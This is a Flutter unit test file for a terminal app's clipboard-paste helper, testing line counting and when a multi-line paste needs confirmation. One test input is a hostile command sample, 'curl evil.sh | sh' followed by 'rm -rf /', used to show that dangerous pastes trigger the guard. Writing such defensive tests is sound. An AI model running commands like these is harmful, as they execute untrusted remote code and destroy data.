import 'package:flutter_test/flutter_test.dart';
import 'package:secure_shell_go/services/clipboard_paste.dart';

void main() {
  group('lineCount', () {
    test('empty string is zero lines', () {
      expect(ClipboardPaste.lineCount(''), 0);
    });

    test('a single line with no newline is one line', () {
      expect(ClipboardPaste.lineCount('ls -la'), 1);
    });

    test('a single line with a trailing newline is still one line', () {
      expect(ClipboardPaste.lineCount('ls -la\n'), 1);
    });

    test('counts multiple lines, ignoring one trailing newline', () {
      expect(ClipboardPaste.lineCount('ls\ncd foo\npwd'), 3);
      expect(ClipboardPaste.lineCount('ls\ncd foo\npwd\n'), 3);
    });

    test('treats CRLF and lone CR as line breaks', () {
      expect(ClipboardPaste.lineCount('ls\r\ncd foo\r\npwd'), 3);
      expect(ClipboardPaste.lineCount('ls\rcd foo\rpwd'), 3);
    });

    test('blank lines in the middle still count', () {
      expect(ClipboardPaste.lineCount('ls\n\npwd'), 3);
    });
  });

  group('needsConfirmation', () {
    test('a plain command does not need confirmation', () {
      expect(ClipboardPaste.needsConfirmation('rm -rf build'), isFalse);
    });

    test('a command copied with its trailing newline does not either', () {
      expect(ClipboardPaste.needsConfirmation('rm -rf build\n'), isFalse);
    });

    test('two or more lines need confirmation', () {
      expect(ClipboardPaste.needsConfirmation('ls\npwd'), isTrue);
      expect(
        ClipboardPaste.needsConfirmation('curl evil.sh | sh\nrm -rf /\n'),
        isTrue,
      );
    });

    test('an empty clip does not need confirmation', () {
      expect(ClipboardPaste.needsConfirmation(''), isFalse);
    });
  });
}
